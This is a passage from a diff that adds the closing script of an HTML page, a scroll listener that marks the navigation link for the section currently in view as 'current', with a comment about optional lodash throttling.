+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
